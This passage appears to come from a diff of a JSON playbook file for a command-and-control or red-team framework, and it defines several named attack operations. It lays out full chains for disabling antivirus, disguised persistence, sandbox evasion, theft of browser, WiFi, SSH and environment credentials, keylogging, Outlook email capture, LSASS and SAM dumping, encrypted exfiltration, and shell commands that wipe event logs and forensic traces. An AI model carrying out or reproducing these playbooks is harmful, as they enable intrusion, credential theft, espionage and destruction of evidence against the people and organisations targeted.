+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 2 — Network Discovery",
+          "steps": [
+            7,
+            8,
+            9,
+            10
+          ]
+        },
+        {
+          "label": "Phase 3 — Credential Targets",
+          "steps": [
+            11,
+            12,
+            13
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_users"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:domain_admins"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "domain_computers",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_computers"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "trust_domains",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:trust_domains"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "sessions",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:sessions"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "dns_enum",
+          "params": {
+            "domain": "corp.local"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:dns_enum"
+        },
+        {
+          "order": 10,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.1.0/24",
+            "ports": [
+              88,
+              389,
+              445,
+              3268,
+              3389,
+              5985
+            ],
+            "timeout": 0.5
+          },
+          "delay": 5,
+          "timeout": 120,
+          "priority": "normal",
+          "action_description": "Execute port_scan:subnet"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 3,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:ssh_keys"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "KERBEROS",
+              "NTLM",
+              "PASSWORD",
+              "SECRET"
+            ]
+          },
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:env_secrets"
+        }
+      ]
+    },
+    {
+      "id": "op_cleanroom",
+      "name": "OP CLEANROOM — Anti-Forensics Total",
+      "description": "Effacement complet des traces post-opération. Event logs Windows (Security/System/App/PowerShell/WMI), historique PowerShell et shell, prefetch, temp files, thumbnails, recent files, jump lists. Audit de ce qui reste pour confirmer le nettoyage.",
+      "icon": "🧹",
+      "category": "simulation",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Audit Before",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Log Wipe",
+          "steps": [
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 3 — Trace Wipe",
+          "steps": [
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 4 — Audit After",
+          "steps": [
+            7,
+            8
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "builtin",
+          "action": "startup",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:startup"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "recent_files",
+          "params": {
+            "limit": 50
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:recent_files"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "Application",
+              "PowerShell",
+              "Microsoft-Windows-WMI-Activity/Operational"
+            ]
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:clear_logs"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "clear_history",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute builtin:clear_history"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "wipe_traces",
+          "params": {
+            "temp": true,
+            "prefetch": true,
+            "thumbcache": true
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:wipe_traces"
+        },
+        {
+          "order": 6,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\* 2>nul & del /f /q %LOCALAPPDATA%\\Microsoft\\Windows\\Explorer\\thumbcache_*.db 2>nul",
+            "timeout": 15
+          },
+          "delay": 3,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "startup",
+          "params": {},
+          "delay": 3,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:startup"
+        },
+        {
+          "order": 8,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 1,
+            "interval": 1
+          },
+          "delay": 2,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        }
+      ]
+    },
+    {
+      "id": "op_prometheus",
+      "name": "OP PROMETHEUS — Privilege Escalation",
+      "description": "Identification systématique des vecteurs d'escalade de privilèges : services mal configurés, tâches planifiées vulnérables, fichiers avec permissions faibles, tokens, credentials en clair. Cartographie des chemins vers SYSTEM/root.",
+      "icon": "🔥",
+      "category": "lateral",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Context",
+          "steps": [
+            1,
+            2,
+            3,
+            4
+          ]
+        },
+        {
+          "label": "Phase 2 — Weak Configs",
+          "steps": [
+            5,
+            6,
+            7,
+            8
+          ]
+        },
+        {
+          "label": "Phase 3 — Token & Creds",
+          "steps": [
+            9,
+            10,
+            11
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 0,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "users",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:users"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "groups",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:groups"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "services",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:services"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "startup",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute builtin:startup"
+        },
+        {
+          "order": 7,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "whoami /priv",
+            "timeout": 10
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 8,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "schtasks /query /fo LIST /v",
+            "timeout": 20
+          },
+          "delay": 2,
+          "timeout": 25,
+          "priority": "high",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "PASSWORD",
+              "SECRET",
+              "ADMIN"
+            ]
+          },
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:ssh_keys"
+        }
+      ]
+    },
+    {
+      "id": "op_crowbar",
+      "name": "OP CROWBAR — Password Audit",
+      "description": "Audit complet des mots de passe : extraction de tous les credentials stockés (navigateurs, Credential Manager, WiFi, .env, SSH), analyse des politiques de mots de passe AD, collecte des hashes pour audit offline. Évaluation de la solidité des passwords.",
+      "icon": "🔨",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Policy Audit",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Hash Collect",
+          "steps": [
+            4,
+            5,
+            6,
+            7
+          ]
+        },
+        {
+          "label": "Phase 3 — Plain Creds",
+          "steps": [
+            8,
+            9,
+            10,
+            11
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 0,
+          "timeout": 20,
+          "priority": "normal",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 2,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "net accounts /domain",
+            "timeout": 10
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 3,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "net accounts",
+            "timeout": 10
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_users"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:domain_admins"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "sessions",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:sessions"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 8,
+          "module": "browser",
+          "action": "steal",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge",
+              "brave",
+              "opera"
+            ]
+          },
+          "delay": 3,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute browser:steal"
+        },
+        {
+          "order": 9,
+          "module": "wifi",
+          "action": "credentials",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute wifi:credentials"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "PASSWORD",
+              "PASS",
+              "PWD",
+              "SECRET",
+              "TOKEN",
+              "KEY"
+            ]
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "shell_history",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Execute builtin:shell_history"
+        }
+      ]
+    },
+    {
+      "id": "op_oracle",
+      "name": "OP ORACLE — DB & Code Source Exfil",
+      "description": "Exfiltration ciblée sur les actifs à haute valeur : bases de données (SQL, SQLite, MongoDB dumps), code source (tous langages), fichiers de config avec credentials DB, schémas et migrations. Cible les développeurs et DBA.",
+      "icon": "🗄",
+      "category": "exfil",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — DB Discovery",
+          "steps": [
+            1,
+            2,
+            3
+          ]
+        },
+        {
+          "label": "Phase 2 — Code Source",
+          "steps": [
+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 3 — Config & Creds",
+          "steps": [
+            7,
+            8,
+            9
+          ]
+        },
+        {
+          "label": "Phase 4 — Exfil",
+          "steps": [
+            10,
+            11
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {},
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 3,
+          "module": "port_scan",
+          "action": "scan",
+          "params": {
+            "host": "127.0.0.1",
+            "ports": [
+              1433,
+              1521,
+              3306,
+              5432,
+              6379,
+              27017,
+              5984,
+              9200
+            ],
+            "timeout": 0.5
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute port_scan:scan"
+        },
+        {
+          "order": 4,
+          "module": "file",
+          "action": "tree",
+          "params": {
+            "path": "~",
+            "depth": 4
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute file:tree"
+        },
+        {
+          "order": 5,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "find ~ -name '*.sql' -o -name '*.db' -o -name '*.sqlite' -o -name '*.dump' 2>/dev/null | head -50",
+            "timeout": 20
+          },
+          "delay": 3,
+          "timeout": 25,
+          "priority": "critical",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 6,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "find ~ -name '*.py' -o -name '*.js' -o -name '*.go' -o -name '*.java' -o -name '*.cs' 2>/dev/null | head -100",
+            "timeout": 20
+          },
+          "delay": 3,
+          "timeout": 25,
+          "priority": "high",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "DATABASE_URL",
+              "DB_PASSWORD",
+              "DB_HOST",
+              "MONGO",
+              "REDIS",
+              "POSTGRES",
+              "MYSQL"
+            ]
+          },
+          "delay": 2,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 8,
+          "module": "shell",
+          "action": "exec",
+          "params": {
+            "cmd": "find ~ -name 'database.yml' -o -name 'database.json' -o -name 'settings.py' -o -name 'config.js' 2>/dev/null | head -20",
+            "timeout": 15
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute shell:exec"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "shell_history",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "normal",
+          "action_description": "Execute builtin:shell_history"
+        },
+        {
+          "order": 10,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 3,
+            "interval": 5
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 11,
+          "module": "file",
+          "action": "tree",
+          "params": {
+            "path": "~",
+            "depth": 5
+          },
+          "delay": 5,
+          "timeout": 60,
+          "priority": "high",
+          "action_description": "Execute file:tree"
+        }
+      ]
+    },
+    {
+      "id": "op_mirage",
+      "name": "OP MIRAGE — Détection Honeypot",
+      "description": "Analyse complète pour détecter un environnement leurre (honeypot, sandbox, VM d'analyse). Vérifie : VM indicators, analyse tools, uptime court, activité utilisateur faible, réseau trop propre, noms suspects. Abort automatique si détecté.",
+      "icon": "🪞",
+      "category": "recon",
+      "trigger": "on_connect",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — VM & Sandbox Check",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — Environment Analysis",
+          "steps": [
+            3,
+            4,
+            5
+          ]
+        },
+        {
+          "label": "Phase 3 — Network Validation",
+          "steps": [
+            6,
+            7
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 10,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 1,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 3,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "installed",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:installed"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "users",
+          "params": {},
+          "delay": 2,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Execute builtin:users"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 7,
+          "module": "port_scan",
+          "action": "scan",
+          "params": {
+            "host": "8.8.8.8",
+            "ports": [
+              53,
+              80,
+              443
+            ],
+            "timeout": 1.0
+          },
+          "delay": 3,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute port_scan:scan"
+        }
+      ]
+    },
+    {
+      "id": "op_atlas",
+      "name": "OP ATLAS — APT Nation-State (Full Chain)",
+      "description": "La chaîne d'attaque APT la plus complète. 5 phases sur le modèle MITRE ATT&CK. Initial Access → Persistence triple → Recon AD complet → Credential harvest exhaustif → Lateral movement → Data collection → Exfil chiffrée → Cover tracks total. Durée estimée : 45-90 min.",
+      "icon": "💀",
+      "category": "full",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Initial Access & Assessment",
+          "steps": [
+            1,
+            2,
+            3,
+            4,
+            5,
+            6
+          ]
+        },
+        {
+          "label": "Phase 2 — Persistence & Defense Evasion",
+          "steps": [
+            7,
+            8,
+            9,
+            10,
+            11
+          ]
+        },
+        {
+          "label": "Phase 3 — Discovery & Lateral Prep",
+          "steps": [
+            12,
+            13,
+            14,
+            15,
+            16,
+            17
+          ]
+        },
+        {
+          "label": "Phase 4 — Credential Access & Collection",
+          "steps": [
+            18,
+            19,
+            20,
+            21,
+            22,
+            23,
+            24
+          ]
+        },
+        {
+          "label": "Phase 5 — Exfiltration & Cover Tracks",
+          "steps": [
+            25,
+            26,
+            27,
+            28,
+            29,
+            30
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "anti_analysis",
+          "action": "check",
+          "params": {
+            "abort_on_detected": true
+          },
+          "delay": 0,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:check"
+        },
+        {
+          "order": 2,
+          "module": "anti_analysis",
+          "action": "evade",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute anti_analysis:evade"
+        },
+        {
+          "order": 3,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute info:run"
+        },
+        {
+          "order": 4,
+          "module": "builtin",
+          "action": "sysinfo",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:sysinfo"
+        },
+        {
+          "order": 5,
+          "module": "builtin",
+          "action": "users",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:users"
+        },
+        {
+          "order": 6,
+          "module": "builtin",
+          "action": "processes",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:processes"
+        },
+        {
+          "order": 7,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "registry",
+            "key": "WindowsDefenderService"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 8,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "scheduled_task",
+            "name": "AdobeCloudSync",
+            "interval": "hourly"
+          },
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 9,
+          "module": "builtin",
+          "action": "persist",
+          "params": {
+            "method": "startup_folder"
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:persist"
+        },
+        {
+          "order": 10,
+          "module": "builtin",
+          "action": "disable_defender",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:disable_defender"
+        },
+        {
+          "order": 11,
+          "module": "builtin",
+          "action": "hide",
+          "params": {
+            "method": "attrib_hidden"
+          },
+          "delay": 2,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "Execute builtin:hide"
+        },
+        {
+          "order": 12,
+          "module": "builtin",
+          "action": "netinfo",
+          "params": {},
+          "delay": 3,
+          "timeout": 30,
+          "priority": "normal",
+          "action_description": "Execute builtin:netinfo"
+        },
+        {
+          "order": 13,
+          "module": "builtin",
+          "action": "domain_users",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:domain_users"
+        },
+        {
+          "order": 14,
+          "module": "builtin",
+          "action": "domain_admins",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:domain_admins"
+        },
+        {
+          "order": 15,
+          "module": "port_scan",
+          "action": "subnet",
+          "params": {
+            "cidr": "192.168.1.0/24",
+            "ports": [
+              22,
+              80,
+              88,
+              135,
+              139,
+              443,
+              445,
+              1433,
+              3268,
+              3389,
+              5985
+            ],
+            "timeout": 1
+          },
+          "delay": 5,
+          "timeout": 150,
+          "priority": "normal",
+          "action_description": "Execute port_scan:subnet"
+        },
+        {
+          "order": 16,
+          "module": "builtin",
+          "action": "shares",
+          "params": {},
+          "delay": 3,
+          "timeout": 60,
+          "priority": "normal",
+          "action_description": "Execute builtin:shares"
+        },
+        {
+          "order": 17,
+          "module": "builtin",
+          "action": "sessions",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute builtin:sessions"
+        },
+        {
+          "order": 18,
+          "module": "browser",
+          "action": "passwords",
+          "params": {
+            "browsers": [
+              "chrome",
+              "firefox",
+              "edge",
+              "brave"
+            ]
+          },
+          "delay": 5,
+          "timeout": 90,
+          "priority": "critical",
+          "action_description": "Execute browser:passwords"
+        },
+        {
+          "order": 19,
+          "module": "browser",
+          "action": "cookies",
+          "params": {},
+          "delay": 3,
+          "timeout": 60,
+          "priority": "high",
+          "action_description": "Execute browser:cookies"
+        },
+        {
+          "order": 20,
+          "module": "wifi",
+          "action": "passwords",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "high",
+          "action_description": "Execute wifi:passwords"
+        },
+        {
+          "order": 21,
+          "module": "builtin",
+          "action": "credential_manager",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:credential_manager"
+        },
+        {
+          "order": 22,
+          "module": "builtin",
+          "action": "ssh_keys",
+          "params": {},
+          "delay": 2,
+          "timeout": 20,
+          "priority": "high",
+          "action_description": "Execute builtin:ssh_keys"
+        },
+        {
+          "order": 23,
+          "module": "builtin",
+          "action": "env_secrets",
+          "params": {
+            "patterns": [
+              "TOKEN",
+              "SECRET",
+              "PASSWORD",
+              "API_KEY",
+              "AWS",
+              "AZURE",
+              "GCP"
+            ]
+          },
+          "delay": 2,
+          "timeout": 20,
+          "priority": "critical",
+          "action_description": "Execute builtin:env_secrets"
+        },
+        {
+          "order": 24,
+          "module": "keylog",
+          "action": "start",
+          "params": {
+            "duration": 120,
+            "flush_interval": 30
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "high",
+          "action_description": "Execute keylog:start"
+        },
+        {
+          "order": 25,
+          "module": "screen_stream",
+          "action": "frame",
+          "params": {
+            "quality": 85
+          },
+          "delay": 5,
+          "timeout": 15,
+          "priority": "normal",
+          "action_description": "Execute screen_stream:frame"
+        },
+        {
+          "order": 26,
+          "module": "screenshot",
+          "action": "capture",
+          "params": {
+            "count": 10,
+            "interval": 8
+          },
+          "delay": 2,
+          "timeout": 120,
+          "priority": "normal",
+          "action_description": "Execute screenshot:capture"
+        },
+        {
+          "order": 27,
+          "module": "file",
+          "action": "search",
+          "params": {
+            "pattern": "*.pdf,*.docx,*.xlsx,*.pptx,.env,*.pem,id_rsa,*.db,*.sql,NDA*,Confidentiel*",
+            "max": 500,
+            "recursive": true
+          },
+          "delay": 5,
+          "timeout": 240,
+          "priority": "critical",
+          "action_description": "Execute file:search"
+        },
+        {
+          "order": 28,
+          "module": "builtin",
+          "action": "outlook_emails",
+          "params": {
+            "limit": 300,
+            "folders": [
+              "Inbox",
+              "Sent",
+              "Drafts"
+            ]
+          },
+          "delay": 5,
+          "timeout": 180,
+          "priority": "high",
+          "action_description": "Execute builtin:outlook_emails"
+        },
+        {
+          "order": 29,
+          "module": "file",
+          "action": "exfil",
+          "params": {
+            "compress": true,
+            "encrypt": true,
+            "chunk_size": 512000
+          },
+          "delay": 10,
+          "timeout": 600,
+          "priority": "critical",
+          "action_description": "Execute file:exfil"
+        },
+        {
+          "order": 30,
+          "module": "builtin",
+          "action": "clear_logs",
+          "params": {
+            "logs": [
+              "Security",
+              "System",
+              "Application",
+              "PowerShell",
+              "WMI"
+            ]
+          },
+          "delay": 5,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "Execute builtin:clear_logs"
+        }
+      ]
+    },
+    {
+      "id": "op_credential_rip",
+      "name": "OP CREDENTIAL RIP — LSASS + Registry + DPAPI",
+      "description": "Extraction complete des credentials Windows: dump LSASS, sauvegarde des hives SAM/SYSTEM/SECURITY, et extraction des master keys DPAPI. Combine T1003.001 + T1003.002 + T1555.004. Resultat: hashes NTLM, tickets Kerberos, cles de decryptage browser.",
+      "icon": "🔑",
+      "category": "credentials",
+      "trigger": "manual",
+      "agent_group": [
+        "all"
+      ],
+      "mitre_techniques": [
+        "T1003.001",
+        "T1003.002",
+        "T1555.004",
+        "T1558"
+      ],
+      "tags": [
+        "lsass",
+        "sam",
+        "dpapi",
+        "ntlm",
+        "kerberos",
+        "credentials",
+        "mimikatz"
+      ],
+      "phases": [
+        {
+          "label": "Phase 1 — Recon Target",
+          "steps": [
+            1,
+            2
+          ]
+        },
+        {
+          "label": "Phase 2 — LSASS Dump",
+          "steps": [
+            3
+          ]
+        },
+        {
+          "label": "Phase 3 — Registry Hives",
+          "steps": [
+            4
+          ]
+        },
+        {
+          "label": "Phase 4 — DPAPI Keys",
+          "steps": [
+            5
+          ]
+        },
+        {
+          "label": "Phase 5 — Kerberos Cache",
+          "steps": [
+            6
+          ]
+        }
+      ],
+      "steps": [
+        {
+          "order": 1,
+          "module": "info",
+          "action": "run",
+          "params": {},
+          "delay": 0,
+          "timeout": 15,
+          "priority": "high",
+          "action_description": "System info recon"
+        },
+        {
+          "order": 2,
+          "module": "token",
+          "action": "get_privileges",
+          "params": {},
+          "delay": 1,
+          "timeout": 10,
+          "priority": "high",
+          "action_description": "Check SeDebugPrivilege"
+        },
+        {
+          "order": 3,
+          "module": "credential_dump",
+          "action": "lsass",
+          "params": {},
+          "delay": 2,
+          "timeout": 45,
+          "priority": "critical",
+          "action_description": "LSASS MiniDump via comsvcs.dll"
+        },
+        {
+          "order": 4,
+          "module": "credential_dump",
+          "action": "registry",
+          "params": {},
+          "delay": 2,
+          "timeout": 30,
+          "priority": "critical",
+          "action_description": "reg save SAM/SYSTEM/SECURITY hives"
+        },
+        {
+          "order": 5,
+          "module": "credential_dump",
+          "action": "dpapi",
+          "params": {},
+          "delay": 2,
+          "timeout": 15,
+          "priority": "critical",
+          "action_description": "DPAPI master keys extraction"
+        },
+        {
+          "order": 6,
+          "module": "credential_dump",
+          "action": "kerberos",
+          "params": {},
+          "delay": 1,
+          "timeout": 15,
+          "priority": "high",
